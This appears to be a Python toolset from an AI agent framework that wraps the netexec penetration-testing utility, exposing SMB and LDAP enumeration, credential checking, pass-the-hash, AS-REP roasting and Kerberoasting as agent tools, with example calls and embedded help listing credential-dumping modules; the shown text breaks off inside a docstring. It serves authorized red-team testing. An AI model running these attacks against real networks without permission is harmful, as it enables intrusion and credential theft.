import tempfile
from pathlib import Path

from dreadnode import Config
from dreadnode.agents.tools import Toolset, tool_method
from dreadnode.tools.execute import execute
from loguru import logger


class Netexec(Toolset):
    """
    A toolset for network operations using the Netexec (nxc) utility.
    """

    variant: str | None = Config(default="all")
    """Expose generic protocol functions or specialized methods wrapping common use cases (or both)."""
    timeout: int = Config(default=60)
    """Default timeout for commands in seconds."""

    @tool_method(catch=True, variants=["all"])
    async def netexec(
        self,
        protocol: str,
        targets: list[str],
        args: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
        local_auth: bool = False,
    ) -> str:
        """
        Execute Netexec (nxc) for one or more targets. Use this to execute
        commands or actions not covered by other specialized tools.

        Args:
            protocol: The protocol to use. Can be one of:
                ssh, wmi, mssql, vnc, ldap, nfs, smb, winrm, ftp, or rdp.
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            args: A list of additional arguments and flags for netexec (e.g., ['--help']).
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
            local_auth: Use local authentication (`--local-auth`). Mutually exclusive with `domain`.
        """
        # Fix netexec first-run setup issue if .nxc exists as a file instead of directory
        nxc_path = Path.home() / ".nxc"
        if nxc_path.exists() and nxc_path.is_file():
            logger.warning(
                f"Found {nxc_path} as a file instead of directory, removing to allow netexec setup"
            )
            nxc_path.unlink()

        cmd = ["netexec", protocol, *targets]

        if local_auth:
            cmd.append("--local-auth")
        elif domain:
            cmd.extend(["-d", domain])

        if username:
            cmd.extend(
                ["-u", *(username if isinstance(username, list) else [username])]
            )
        if password:
            cmd.extend(
                ["-p", *(password if isinstance(password, list) else [password])]
            )
        if hash:
            cmd.extend(["-H", *(hash if isinstance(hash, list) else [hash])])

        env: dict[str, str] | None = None
        if kerberos:
            cmd.extend(["-k"])
            if len(kerberos) == 32 or len(kerberos) == 64:  # AES key
                cmd.extend(["--aesKey", kerberos])
            else:
                env = {"KRB5CCNAME": kerberos}
                cmd.append("--use-kcache")

        cmd.extend(args)

        logger.info(f"Running 'netexec {protocol}' with args: {' '.join(args)}")
        return await execute(cmd, timeout=self.timeout, env=env)

    # Specialized methods

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_smb_enum(
        self,
        targets: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
        local_auth: bool = False,
    ) -> str:
        """
        Enumerates local users, groups, and logged on users on one or more hosts via SMB.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
            local_auth: Use local authentication (`--local-auth`). Mutually exclusive with `domain`.
        """
        return await self.netexec(
            "smb",
            targets,
            args=["--users", "--groups", "--loggedon-users"],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
            local_auth=local_auth,
        )

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_smb_auth(
        self,
        targets: list[str],
        username: str | list[str],
        *,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
        local_auth: bool = False,
    ) -> str:
        """
        Authenticate via SMB to one or more hosts to verify credentials.

        Administrator rights will be indicated by 'Pwn3d' in the output.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
            local_auth: Use local authentication (`--local-auth`). Mutually exclusive with `domain`.
        """
        return await self.netexec(
            "smb",
            targets,
            args=[],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
            local_auth=local_auth,
        )

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_smb_enum_group_members(
        self,
        targets: list[str],
        groups: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
        local_auth: bool = False,
    ) -> str:
        """
        Enumerates local group members.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            groups: Group names to query members for.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
            local_auth: Use local authentication (`--local-auth`). Mutually exclusive with `domain`.
        """
        # netexec --groups only accepts one group at a time, so we loop
        # and join results when multiple groups are requested.
        results: list[str] = []
        for group in groups:
            try:
                output = await self.netexec(
                    "smb",
                    targets,
                    args=["--groups", group],
                    username=username,
                    password=password,
                    domain=domain,
                    hash=hash,
                    kerberos=kerberos,
                    local_auth=local_auth,
                )
                results.append(output)
            except Exception:
                logger.exception(f"Failed to query SMB group '{group}'")
                results.append(f"[error querying group '{group}']")
        return "\n".join(results)

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_smb_enum_shares(
        self,
        targets: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
        local_auth: bool = False,
    ) -> str:
        """
        Enumerates shares on one or more hosts using netexec.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
            local_auth: Use local authentication (`--local-auth`). Mutually exclusive with `domain`.
        """
        return await self.netexec(
            "smb",
            targets,
            args=["--shares"],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
            local_auth=local_auth,
        )

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_ldap_enum(
        self,
        targets: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
    ) -> str:
        """
        Enumerates domain computers, users, groups, domain controllers, and trusts via LDAP using netexec.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
        """
        return await self.netexec(
            "ldap",
            targets,
            args=["--computers", "--users", "--groups", "--dc-list"],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
        )

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_ldap_auth(
        self,
        targets: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
    ) -> str:
        """
        Authenticate via LDAP to one or more domain controllers using netexec to verify credentials.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
        """
        return await self.netexec(
            "ldap",
            targets,
            args=[],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
        )

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_ldap_enum_group_members(
        self,
        targets: list[str],
        groups: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
    ) -> str:
        """
        Enumerates domain group members.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            groups: Group names to query members for.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
        """
        # netexec --groups only accepts one group at a time, so we loop
        # and join results when multiple groups are requested.
        results: list[str] = []
        for group in groups:
            try:
                output = await self.netexec(
                    "ldap",
                    targets,
                    args=["--groups", group],
                    username=username,
                    password=password,
                    domain=domain,
                    hash=hash,
                    kerberos=kerberos,
                )
                results.append(output)
            except Exception:
                logger.exception(f"Failed to query LDAP group '{group}'")
                results.append(f"[error querying group '{group}']")
        return "\n".join(results)

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_asreproast(
        self,
        targets: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | None = None,
    ) -> str:
        """
        Performs an AS-REP roasting attack against a domain controller.

        - Without auth: Pass target user(s) with an empty password - only those usernames will be queried.
        - With auth: Pass a valid username and password - all domain users will be queried.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
        """
        _, output_path = tempfile.mkstemp(suffix="_asreproast.txt")
        output = await self.netexec(
            "ldap",
            targets,
            args=["--asreproast", output_path],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
        )
        if "$krb5asrep$" in output:
            output += f"\n\n[+] AS-REP roast hashes saved to {output_path}"
        return output

    @tool_method(catch=True, variants=["specialized", "all"])
    async def netexec_kerberoast(
        self,
        targets: list[str],
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
    ) -> str:
        """
        Performs a Kerberoasting attack against one or more Domain Controllers.

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
        """
        _, output_path = tempfile.mkstemp(suffix="_kerberoast.txt")
        output = await self.netexec(
            "ldap",
            targets,
            args=["--kerberoast", output_path],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
        )
        if "$krb5tgs$" in output:
            output += f"\n\n[+] Kerberoast hashes saved to {output_path}"
        return output

    # General methods

    @tool_method(catch=True, variants=["generic", "all"])
    async def netexec_smb(
        self,
        targets: list[str],
        args: list[str] | None = None,
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
        local_auth: bool = False,
    ) -> str:
        """
        Execute a netexec SMB protocol command.

        Usage Examples:
            # Test authentication with password
            await netexec_smb(
                targets=["192.168.1.10"],
                args=[],
                username="admin",
                password="Password123"
            )

            # Enumerate shares across subnet with domain auth
            await netexec_smb(
                targets=["192.168.1.0/24"],
                args=["--shares"],
                username="user",
                password="pass",
                domain="corp.local"
            )

            # Pass-the-hash to dump SAM
            await netexec_smb(
                targets=["dc01.corp.local"],
                args=["--sam"],
                username="administrator",
                hash="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
            )

        <documentation>
        positional arguments:
        target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

        options:
        -h, --help            show this help message and exit
        -H, --hash HASH [HASH ...]
                                NTLM hash(es) or file(s) containing NTLM hashes
        --delegate DELEGATE   Impersonate user with S4U2Self + S4U2Proxy
        --self                Only do S4U2Self, no S4U2Proxy (use with delegate)
        -d, --domain DOMAIN   domain to authenticate to
        --local-auth          authenticate locally to each target
        --port PORT           SMB port (default: 445)
        --share SHARE         specify a share (default: C$)
        --smb-server-port SMB_SERVER_PORT
                                specify a server port for SMB (default: 445)
        --no-smbv1            Force to disable SMBv1 in connection
        --gen-relay-list OUTPUT_FILE
                                outputs all hosts that don't require SMB signing to the specified file
        --smb-timeout SMB_TIMEOUT
                                SMB connection timeout (default: 2)
        --laps [LAPS]         LAPS authentification
        --generate-hosts-file GENERATE_HOSTS_FILE
                                Generate a hosts file like from a range of IP
        --generate-krb5-file GENERATE_KRB5_FILE
                                Generate a krb5 file like from a range of IP

        Generic:
        Generic options for nxc across protocols

        --version             Display nxc version
        -t, --threads THREADS
                                set how many concurrent threads to use (default: 256)
        --timeout TIMEOUT     max timeout in seconds of each thread
        --jitter INTERVAL     sets a random delay between each authentication

        Output:
        Options to set verbosity levels and control output

        --verbose             enable verbose output
        --debug               enable debug level information
        --no-progress         do not displaying progress bar during scan
        --log LOG             export result into a custom file

        DNS:
        -6                    Enable force IPv6
        --dns-server DNS_SERVER
                                Specify DNS server (default: Use hosts file & System DNS)
        --dns-tcp             Use TCP instead of UDP for DNS queries
        --dns-timeout DNS_TIMEOUT
                                DNS query timeout in seconds (default: 3)

        Authentication:
        Options for authenticating

        -u, --username USERNAME [USERNAME ...]
                                username(s) or file(s) containing usernames
        -p, --password PASSWORD [PASSWORD ...]
                                password(s) or file(s) containing passwords
        -id CRED_ID [CRED_ID ...]
                                database credential ID(s) to use for authentication
        --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
        --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2)
        --continue-on-success
                                continues authentication attempts even after successes
        --gfail-limit LIMIT   max number of global failed login attempts
        --ufail-limit LIMIT   max number of failed login attempts per username
        --fail-limit LIMIT    max number of failed login attempts per host

        Kerberos:
        Options for Kerberos authentication

        -k, --kerberos        Use Kerberos authentication
        --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
        --aesKey AESKEY [AESKEY ...]
                                AES key to use for Kerberos Authentication (128 or 256 bits)
        --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

        Certificate:
        Options for certificate authentication

        --pfx-cert PFXCERT    Use certificate authentication from pfx file .pfx
        --pfx-base64 PFXB64   Use certificate authentication from pfx file encoded in base64
        --pfx-pass PFXPASS    Password of the pfx certificate
        --pem-cert PEMCERT    Use certificate authentication from PEM file
        --pem-key PEMKEY      Private key for the PEM format

        Servers:
        Options for nxc servers

        --server {https,http}
                                use the selected server (default: https)
        --server-host HOST    IP to bind the server to (default: 0.0.0.0)
        --server-port PORT    start the server on the specified port
        --connectback-host CHOST
                                IP for the remote system to connect back to

        Modules:
        Options for nxc modules

        -M, --module MODULE   module to use
        -o MODULE_OPTION [MODULE_OPTION ...]
                                module options
        -L, --list-modules    list available modules
        --options             display module options

        Credential Gathering:
        Options for gathering credentials

        --sam [{secdump,regdump}]
                                dump SAM hashes from target systems
        --lsa [{secdump,regdump}]
                                dump LSA secrets from target systems
        --ntds [{drsuapi,vss}]
                                dump the NTDS.dit from target DCs using the specifed method
        --dpapi [{nosystem,cookies} ...]
                                dump DPAPI secrets from target systems, can dump cookies if you add 'cookies', will not dump SYSTEM dpapi if you add nosystem
        --sccm [{wmi,disk}]   dump SCCM secrets from target systems
        --mkfile MKFILE       DPAPI option. File with masterkeys in form of {GUID}:SHA1
        --pvk PVK             DPAPI option. File with domain backupkey
        --enabled             Only dump enabled targets from DC
        --user USERNTDS       Dump selected user from DC

        Mapping/Enumeration:
        Options for Mapping/Enumerating

        --shares              Enumerate shares and access
        --dir [DIR]           List the content of a path (default path: '')
        --interfaces          Enumerate network interfaces
        --no-write-check      Skip write check on shares (avoid leaving traces when missing delete permissions)
        --filter-shares FILTER_SHARES [FILTER_SHARES ...]
                                Filter share by access, option 'read' 'write' or 'read,write'
        --smb-sessions        Enumerate active smb sessions
        --disks               Enumerate disks
        --loggedon-users-filter LOGGEDON_USERS_FILTER
                                only search for specific user, works with regex
        --loggedon-users [LOGGEDON_USERS]
                                Enumerate logged on users, if a user is specified than a regex filter is applied.
        --users [USER ...]    Enumerate domain users, if a user is specified than only its information is queried.
        --users-export USERS_EXPORT
                                Enumerate domain users and export them to the specified file
        --groups [GROUP]      Enumerate domain groups, if a group is specified than its members are Enumerated
        --computers [COMPUTER]
                                Enumerate computer users
        --local-groups [GROUP]
                                Enumerate local groups, if a group is specified then its members are Enumerated
        --pass-pol            dump password policy
        --rid-brute [MAX_RID]
                                Enumerate users by bruteforcing RIDs
        --qwinsta             Enumerate RDP connections
        --tasklist            Enumerate running processes

        WMI:
        Options for WMI Queries

        --wmi QUERY           issues the specified WMI query
        --wmi-namespace NAMESPACE
                                WMI Namespace (default: root\\cimv2)

        Spidering:
        Options for spidering shares

        --spider SHARE        share to spider
        --spider-folder FOLDER
                                folder to spider (default: .)
        --content             enable file content searching
        --exclude-dirs DIR_LIST
                                directories to exclude from spidering
        --depth DEPTH         max spider recursion depth
        --only-files          only spider files
        --pattern PATTERN [PATTERN ...]
                                pattern(s) to search for in folders, filenames and file content
        --regex REGEX [REGEX ...]
                                regex(s) to search for in folders, filenames and file content

        Files:
        Options for remote file interaction

        --put-file FILE FILE  Put a local file into remote target, ex: whoami.txt \\Windows\\Temp\\whoami.txt
        --get-file FILE FILE  Get a remote file, ex: \\Windows\\Temp\\whoami.txt whoami.txt
        --append-host         append the host to the get-file filename

        Command Execution:
        Options for executing commands

        --exec-method {wmiexec,atexec,smbexec,mmcexec}
                                method to execute the command. Ignored if in MSSQL mode (default: wmiexec)
        --dcom-timeout DCOM_TIMEOUT
                                DCOM connection timeout (default: 5)
        --get-output-tries GET_OUTPUT_TRIES
                                Number of times atexec/smbexec/mmcexec tries to get results (default: 10)
        --codec CODEC         Set encoding used (codec) from the target's output. If errors are detected, run chcp.com at the target & map the result with
                                https://docs.python.org/3/library/codecs.html#standard-encodings and then execute again with --codec and the corresponding codec (default: utf-8)
        --no-output           do not retrieve command output
        -x COMMAND            execute the specified CMD command
        -X PS_COMMAND         execute the specified PowerShell command

        Powershell Obfuscation:
        Options for PowerShell script obfuscation

        --obfs                Obfuscate PowerShell scripts
        --amsi-bypass FILE    File with a custom AMSI bypass
        --clear-obfscripts    Clear all cached obfuscated PowerShell scripts
        --force-ps32          force PowerShell commands to run in a 32-bit process (may not apply to modules)
        --no-encode           Do not encode the PowerShell command ran on target
        </documentation>

        <modules>
        LOW PRIVILEGE MODULES
        [*] add-computer              Adds or deletes a domain computer
        [*] backup_operator           Exploit user in backup operator group to dump NTDS @mpgn_x64
        [*] coerce_plus               Module to check if the Target is vulnerable to any coerce vulns. Set LISTENER IP for coercion.
        [*] drop-sc                   Drop a searchConnector-ms file on each writable share
        [*] enum_av                   Gathers information on all endpoint protection solutions installed on the the remote host(s) via LsarLookupNames (no privilege needed)
        [*] enum_ca                   Anonymously uses RPC endpoints to hunt for ADCS CAs
        [*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
        [*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
        [*] ioxidresolver             This module helps you to identify hosts that have additional active interfaces
        [*] ms17-010                  MS17-010 - EternalBlue - NOT TESTED OUTSIDE LAB ENVIRONMENT
        [*] nopac                     Check if the DC is vulnerable to CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user
        [*] printnightmare            Check if host vulnerable to printnightmare
        [*] remove-mic                Check if host vulnerable to CVE-2019-1040
        [*] scuffy                    Creates and dumps an arbitrary .scf file with the icon property containing a UNC path to the declared SMB server against all writeable shares
        [*] slinky                    Creates windows shortcuts with the icon attribute containing a URI to the specified  server (default SMB) in all shares with write permissions
        [*] smbghost                  Module to check for the SMB dialect 3.1.1 and compression capability of the host, which is an indicator for the SMBGhost vulnerability (CVE-2020-0796).
        [*] spider_plus               List files recursively and save a JSON share-file metadata to the 'OUTPUT_FOLDER'. See module options for finer configuration.
        [*] spooler                   Detect if print spooler is enabled or not
        [*] timeroast                 Timeroasting exploits Windows NTP authentication to request password hashes of any computer or trust account
        [*] webdav                    Checks whether the WebClient service is running on the target
        [*] zerologon                 Module to check if the DC is vulnerable to Zerologon aka CVE-2020-1472

        HIGH PRIVILEGE MODULES (requires admin privs)
        [*] bitlocker                 Enumerating BitLocker Status on target(s) If it is enabled or disabled.
        [*] dpapi_hash                Remotely dump Dpapi hash based on masterkeys
        [*] empire_exec               Uses Empire's RESTful API to generate a launcher for the specified listener and executes it
        [*] enum_dns                  Uses WMI to dump DNS from an AD DNS Server
        [*] get_netconnections        Uses WMI to query network connections.
        [*] handlekatz                Get lsass dump using handlekatz64 and parse the result with pypykatz
        [*] hash_spider               Dump lsass recursively from a given hash using BH to find local admins
        [*] hyperv-host               Performs a registry query on the VM to lookup its HyperV Host
        [*] iis                       Checks for credentials in IIS Application Pool configuration files using appcmd.exe
        [*] impersonate               List and impersonate tokens to run command as locally logged on users
        [*] install_elevated          Checks for AlwaysInstallElevated
        [*] keepass_discover          Search for KeePass-related files and process.
        [*] keepass_trigger           Set up a malicious KeePass trigger to export the database in cleartext.
        [*] lsassy                    Dump lsass and parse the result remotely with lsassy
        [*] masky                     Remotely dump domain user credentials via an ADCS and a KDC
        [*] met_inject                Downloads the Meterpreter stager and injects it into memory
        [*] mobaxterm                 Remotely dump MobaXterm credentials via RemoteRegistry or NTUSER.dat export
        [*] mremoteng                 Dump mRemoteNG Passwords in AppData and in Desktop / Documents folders (digging recursively in them)
        [*] msol                      Dump MSOL cleartext password from the localDB on the Azure AD-Connect Server
        [*] nanodump                  Get lsass dump using nanodump and parse the result with pypykatz
        [*] notepad++                 Extracts notepad++ unsaved files.
        [*] ntdsutil                  Dump NTDS with ntdsutil
        [*] ntlmv1                    Detect if lmcompatibilitylevel on the target is set to lower than 3 (which means ntlmv1 is enabled)
        [*] pi                        Run command as logged on users via Process Injection
        [*] powershell_history        Extracts PowerShell history for all users and looks for sensitive commands.
        [*] procdump                  Get lsass dump using procdump64 and parse the result with pypykatz
        [*] putty                     Query the registry for users who saved ssh private keys in PuTTY. Download the private keys if found.
        [*] rdcman                    Remotely dump Remote Desktop Connection Manager (sysinternals) credentials
        [*] rdp                       Enables/Disables RDP
        [*] recent_files              Extracts recently modified files
        [*] reg-query                 Performs a registry query on the machine
        [*] reg-winlogon              Collect autologon credential stored in the registry
        [*] remote-uac                Enable or disable remote UAC
        [*] runasppl                  Check if the registry value RunAsPPL is set or not
        [*] schtask_as                Remotely execute a scheduled task as a logged on user
        [*] security-questions        Gets security questions and answers for users on computer
        [*] shadowrdp                 Enables or disables shadow RDP
        [*] snipped                   Downloads screenshots taken by the (new) Snipping Tool.
        [*] teams_localdb             Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process
        [*] test_connection           Pings a host
        [*] uac                       Checks UAC status
        [*] veeam                     Extracts credentials from local Veeam SQL Database
        [*] vnc                       Loot Passwords from VNC server and client configurations
        [*] wam                       Dump access token from Token Broker Cache. More info here https://blog.xpnsec.com/wam-bam/. Module by zblurx
        [*] wcc                       Check various security configuration items on Windows machines
        [*] wdigest                   Creates/Deletes the 'UseLogonCredential' registry key enabling WDigest cred dumping on Windows >= 8.1
        [*] web_delivery              Kicks off a Metasploit Payload using the exploit/multi/script/web_delivery module
        [*] wifi                      Get key of all wireless interfaces
        [*] winscp                    Looks for WinSCP.ini files in the registry and default locations and tries to extract credentials.
        </modules>

        Args:
            targets: A list of IPs, ranges, CIDRs, hostnames, or FQDNs.
            args: Additional command line arguments for the command.
            username: Username, list of usernames, or a path to a user file (empty for null session).
            password: Password, list of passwords, or a path to a password file (empty for null session).
            domain: Domain for authentication.
            hash: A single NTLM hash, a list of hashes, or a path to a hash file.
            kerberos: Kerberos ccache file path or AES key for authentication.
            local_auth: Use local authentication (`--local-auth`). Mutually exclusive with `domain`.
        """
        if args is None:
            args = []
        return await self.netexec(
            "smb",
            targets,
            args=["--verbose", *args],
            username=username,
            password=password,
            domain=domain,
            hash=hash,
            kerberos=kerberos,
            local_auth=local_auth,
        )

    @tool_method(catch=True, variants=["generic", "all"])
    async def netexec_ldap(
        self,
        targets: list[str],
        args: list[str] | None = None,
        *,
        username: str | list[str] | None = None,
        password: str | list[str] | None = None,
        domain: str | None = None,
        hash: str | list[str] | None = None,
        kerberos: str | None = None,
    ) -> str:
        """
        Execute a netexec LDAP protocol command.

        Usage Examples:
            # Test LDAP authentication
            await netexec_ldap(
                targets=["10.10.10.100"],
                args=[],
                username="user",
                password="Password123",
                domain="corp.local"
            )

            # Enumerate domain users and computers
            await netexec_ldap(
                targets=["dc.corp.local"],
                args=["--users", "--computers"],
                username="user",
                password="pass",
                domain="corp.local"
            )

            # Dump GMSA passwords with hash
            await netexec_ldap(
                targets=["192.168.1.5"],
                args=["--gmsa"],
                username="administrator",
                hash="aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
                domain="corp.local"
            )

        <documentation>
        positional arguments:
        target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

        options:
        -h, --help            show this help message and exit
        -H, --hash HASH [HASH ...]
                                NTLM hash(es) or file(s) containing NTLM hashes
        --port PORT           LDAP port (default: 389)
        -d DOMAIN             domain to authenticate to
        --local-auth          authenticate locally to each target

        Generic:
        Generic options for nxc across protocols

        --version             Display nxc version
        -t, --threads THREADS
                                set how many concurrent threads to use (default: 256)
        --timeout TIMEOUT     max timeout in seconds of each thread
        --jitter INTERVAL     sets a random delay between each authentication

        Output:
        Options to set verbosity levels and control output

        --verbose             enable verbose output
        --debug               enable debug level information
        --no-progress         do not displaying progress bar during scan
        --log LOG             export result into a custom file

        DNS:
        -6                    Enable force IPv6
        --dns-server DNS_SERVER
                                Specify DNS server (default: Use hosts file & System DNS)
        --dns-tcp             Use TCP instead of UDP for DNS queries
        --dns-timeout DNS_TIMEOUT
                                DNS query timeout in seconds (default: 3)

        Authentication:
        Options for authenticating

        -u, --username USERNAME [USERNAME ...]
                                username(s) or file(s) containing usernames
        -p, --password PASSWORD [PASSWORD ...]
                                password(s) or file(s) containing passwords
        -id CRED_ID [CRED_ID ...]
                                database credential ID(s) to use for authentication
        --ignore-pw-decoding  Ignore non UTF-8 characters when decoding the password file
        --no-bruteforce       No spray when using file for username and password (user1 => password1, user2 => password2)
        --continue-on-success
                                continues authentication attempts even after successes
        --gfail-limit LIMIT   max number of global failed login attempts
        --ufail-limit LIMIT   max number of failed login attempts per username
        --fail-limit LIMIT    max number of failed login attempts per host

        Kerberos:
        Options for Kerberos authentication

        -k, --kerberos        Use Kerberos authentication
        --use-kcache          Use Kerberos authentication from ccache file (KRB5CCNAME)
        --aesKey AESKEY [AESKEY ...]
                                AES key to use for Kerberos Authentication (128 or 256 bits)
        --kdcHost KDCHOST     FQDN of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter

        Certificate:
        Options for certificate authentication

        --pfx-cert PFXCERT    Use certificate authentication from pfx file .pfx
        --pfx-base64 PFXB64   Use certificate authentication from pfx file encoded in base64
        --pfx-pass PFXPASS    Password of the pfx certificate
        --pem-cert PEMCERT    Use certificate authentication from PEM file
        --pem-key PEMKEY      Private key for the PEM format

        Servers:
        Options for nxc servers

        --server {http,https}
                                use the selected server (default: https)
        --server-host HOST    IP to bind the server to (default: 0.0.0.0)
        --server-port PORT    start the server on the specified port
        --connectback-host CHOST
                                IP for the remote system to connect back to

        Modules:
        Options for nxc modules

        -M, --module MODULE   module to use
        -o MODULE_OPTION [MODULE_OPTION ...]
                                module options
        -L, --list-modules    list available modules
        --options             display module options

        Retrieve hash on the remote DC:
        Options to get hashes from Kerberos

        --asreproast ASREPROAST
                                Output AS_REP response to crack with hashcat to file
        --kerberoasting KERBEROASTING
                                Output TGS ticket to crack with hashcat to file

        Retrieve useful information on the domain:
        --base-dn BASE_DN     base DN for search queries
        --query QUERY QUERY   Query LDAP with a custom filter and attributes
        --find-delegation     Finds delegation relationships within an Active Directory domain. (Enabled Accounts only)
        --trusted-for-delegation
                                Get the list of users and computers with flag TRUSTED_FOR_DELEGATION
        --password-not-required
                                Get the list of users with flag PASSWD_NOTREQD
        --admin-count         Get user that had the value adminCount=1
        --users [USERS ...]   Enumerate domain users
        --users-export USERS_EXPORT
                                Enumerate domain users and export them to the specified file
        --groups [GROUPS]     Enumerate domain groups, if a group is specified than its members are enumerated
        --computers           Enumerate domain computers
        --dc-list             Enumerate Domain Controllers
        --get-sid             Get domain sid
        --active-users [ACTIVE_USERS ...]
                                Get Active Domain Users Accounts

        Retrieve gmsa on the remote DC:
        Options to play with gmsa

        --gmsa                Enumerate GMSA passwords
        --gmsa-convert-id GMSA_CONVERT_ID
                                Get the secret name of specific gmsa or all gmsa if no gmsa provided
        --gmsa-decrypt-lsa GMSA_DECRYPT_LSA
                                Decrypt the gmsa encrypted value from LSA

        Bloodhound Scan:
        Options to play with Bloodhoud

        --bloodhound          Perform a Bloodhound scan
        -c, --collection COLLECTION
                                Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps,
                                ACL, All. You can specify more than one by separating them with a comma (default: Default)
        </documentation>

        <modules>
